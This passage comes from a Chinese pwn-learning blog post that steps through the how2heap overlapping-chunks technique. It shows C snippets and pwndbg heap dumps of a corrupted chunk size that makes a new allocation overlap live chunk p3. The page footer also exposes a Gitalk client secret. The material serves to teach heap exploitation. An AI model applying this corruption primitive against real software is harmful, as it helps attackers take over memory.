<p>chunk2 的 size 值被修改为 chunk2 和 chunk3 的大小之和，最后一位是标志位。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nNow during the free() operation on p2, the allocator is fooled to think that \nthe nextchunk is p4 ( since p2 + size_p2 now point to p4 ) \n&quot;</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nThis operation will basically create a big free chunk that wrongly includes p3\n&quot;</span>);</span><br><span class="line"><span class="built_in">free</span>(p2);</span><br></pre></td></tr></table></figure>

<p>这样当我们释放 chunk2 的时候，malloc 根据被修改的 size 值，会以为 chunk2 加上 chunk3 的区域都是要释放的，然后就错误地修改了 chunk5 的 prev_size。</p>
<p>修改前：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; p p5</span><br><span class="line">$3 &#x3D; (intptr_t *) 0x603fd0</span><br><span class="line">pwndbg&gt; x&#x2F;20xg p5-2</span><br><span class="line">0x603fc0:	0x00000000000003f0	0x00000000000003f0      &lt;-- prev_size   &#x2F;   size</span><br><span class="line">0x603fd0:	0x4545454545454545	0x4545454545454545</span><br><span class="line">0x603fe0:	0x4545454545454545	0x4545454545454545</span><br><span class="line">0x603ff0:	0x4545454545454545	0x4545454545454545</span><br><span class="line">0x604000:	0x4545454545454545	0x4545454545454545</span><br><span class="line">0x604010:	0x4545454545454545	0x4545454545454545</span><br><span class="line">0x604020:	0x4545454545454545	0x4545454545454545</span><br><span class="line">0x604030:	0x4545454545454545	0x4545454545454545</span><br><span class="line">0x604040:	0x4545454545454545	0x4545454545454545</span><br><span class="line">0x604050:	0x4545454545454545	0x4545454545454545</span><br></pre></td></tr></table></figure>

<p>修改后：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;20xg p5-2</span><br><span class="line">0x603fc0:	0x0000000000000bd0	0x00000000000003f0      &lt;-- prev_size   &#x2F;   size</span><br><span class="line">0x603fd0:	0x4545454545454545	0x4545454545454545</span><br><span class="line">0x603fe0:	0x4545454545454545	0x4545454545454545</span><br><span class="line">0x603ff0:	0x4545454545454545	0x4545454545454545</span><br><span class="line">0x604000:	0x4545454545454545	0x4545454545454545</span><br><span class="line">0x604010:	0x4545454545454545	0x4545454545454545</span><br><span class="line">0x604020:	0x4545454545454545	0x4545454545454545</span><br><span class="line">0x604030:	0x4545454545454545	0x4545454545454545</span><br><span class="line">0x604040:	0x4545454545454545	0x4545454545454545</span><br><span class="line">0x604050:	0x4545454545454545	0x4545454545454545</span><br></pre></td></tr></table></figure>

<p>可以发现，在 free 掉 chunk2 后，chunk2、chunk3 一起被释放。接着它发现紧邻的 chunk4 也是 free 状态，于是把它们合并到了一起，组成了一个大的 free chunk，放入了 unsorted bin 中。chunk5 的 prev_size 也发生了变化。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x6033f0 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x6033f0</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure>

<p>接下来我们申请一块新的 chunk 时，malloc 就会从 unsorted bin 中取出一部分：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nNow let&#x27;s allocate a new chunk with a size that can be satisfied by the previously freed chunk\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">p6 = <span class="built_in">malloc</span>(<span class="number">2000</span>);</span><br><span class="line">real_size_p6 = malloc_usable_size(p6);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nOur malloc() has been satisfied by our crafted big free chunk, now p6 and p3 are overlapping and \nwe can overwrite data in p3 by writing on chunk p6\n&quot;</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nchunk p6 from %p to %p&quot;</span>, p6,  (<span class="keyword">unsigned</span> <span class="keyword">char</span> *)p6+real_size_p6);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nchunk p3 from %p to %p\n&quot;</span>, p3, (<span class="keyword">unsigned</span> <span class="keyword">char</span> *) p3+real_size_p3); </span><br></pre></td></tr></table></figure>

<p>我们这里申请了 p6，它会将 chunk2 和 chunk3 都拿出来：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; p p6</span><br><span class="line">$4 &#x3D; (intptr_t *) 0x603400</span><br><span class="line">pwndbg&gt; p p2</span><br><span class="line">$5 &#x3D; (intptr_t *) 0x603400</span><br><span class="line">pwndbg&gt; bins</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x603bd0 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x603bd0</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line">pwndbg&gt; x&#x2F;20xg 0x603bd0</span><br><span class="line">0x603bd0:	0x4343434343434343	0x00000000000003f1</span><br><span class="line">0x603be0:	0x00007ffff7dd1b78	0x00007ffff7dd1b78</span><br><span class="line">0x603bf0:	0x4444444444444444	0x4444444444444444</span><br><span class="line">0x603c00:	0x4444444444444444	0x4444444444444444</span><br><span class="line">0x603c10:	0x4444444444444444	0x4444444444444444</span><br><span class="line">0x603c20:	0x4444444444444444	0x4444444444444444</span><br><span class="line">0x603c30:	0x4444444444444444	0x4444444444444444</span><br><span class="line">0x603c40:	0x4444444444444444	0x4444444444444444</span><br><span class="line">0x603c50:	0x4444444444444444	0x4444444444444444</span><br><span class="line">0x603c60:	0x4444444444444444	0x4444444444444444</span><br></pre></td></tr></table></figure>

<p>也就是说，这时候 chunk6 和 chunk 3 可以互相控制对方的内存数据了。</p>
</div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">QRZ</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://blog.qrzbing.cn/2019/07/09/how2heap-3/">http://blog.qrzbing.cn/2019/07/09/how2heap-3/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://blog.qrzbing.cn">QRZ's Blog</a>！</span></div></div><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/pwn/">pwn</a></div><nav id="pagination"><div class="prev-post pull-left"><a href="/2019/07/10/how2heap-4/"><i class="fa fa-chevron-left">  </i><span>how2heap-4</span></a></div><div class="next-post pull-right"><a href="/2019/07/08/how2heap-2/"><span>how2heap - 2</span><i class="fa fa-chevron-right"></i></a></div></nav><div id="gitalk-container"></div><script>var gitalk = new Gitalk({
  clientID: 'a28396a0fb37fdc22bce',
  clientSecret: 'e2e4c983cd284773491d067c6055febad1c23689',
  repo: '40m41h42t.github.io',
  owner: '40m41h42t',
  admin: '40m41h42t',
  id: md5(decodeURI(location.pathname)),
  language: 'zh-CN'
})
gitalk.render('gitalk-container')</script></div></div><footer class="footer-bg" style="background-image: url(https://raw.githubusercontent.com/40m41h42t/Images/master/2019/09/866283.png)"><div class="layout" id="footer"><div class="copyright">&copy;2018 - 2020 By QRZ</div><div class="framework-info"><span>驱动 - </span><a target="_blank" rel="noopener" href="http://hexo.io"><span>Hexo</span></a><span class="footer-separator">|</span><span>主题 - </span><a target="_blank" rel="noopener" href="https://github.com/Molunerfinn/hexo-theme-melody"><span>Melody</span></a></div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fa fa-file-o"></i><span id="busuanzi_value_page_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="/js/third-party/anime.min.js"></script><script src="/js/third-party/jquery.min.js"></script><script src="/js/third-party/jquery.fancybox.min.js"></script><script src="/js/third-party/velocity.min.js"></script><script src="/js/third-party/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.9.0"></script><script src="/js/fancybox.js?version=1.9.0"></script><script src="/js/sidebar.js?version=1.9.0"></script><script src="/js/copy.js?version=1.9.0"></script><script src="/js/fireworks.js?version=1.9.0"></script><script src="/js/transition.js?version=1.9.0"></script><script src="/js/scroll.js?version=1.9.0"></script><script src="/js/head.js?version=1.9.0"></script><script type="text/x-mathjax-config">MathJax.Hub.Config({
  tex2jax: {
    inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
    processEscapes: true,
    skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
  },
  CommonHTML: {
    linebreaks: { automatic: true, width: "90% container" }
  },
  "HTML-CSS": { 
    linebreaks: { automatic: true, width: "90% container" }
  },
  "SVG": { 
    linebreaks: { automatic: true, width: "90% container" }
  }
});
</script><script type="text/x-mathjax-config">MathJax.Hub.Queue(function() {
  var all = MathJax.Hub.getAllJax(), i;
  for (i=0; i < all.length; i += 1) {
    all[i].SourceElement().parentNode.className += ' has-jax';
  }
});
</script><script src="https://cdn.jsdelivr.net/npm/mathjax/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script><script>if(/Android|webOS|iPhone|iPod|iPad|BlackBerry/i.test(navigator.userAgent)) {
  $('#nav').addClass('is-mobile')
  $('footer').addClass('is-mobile')
  $('#top-container').addClass('is-mobile')
}</script></body></html>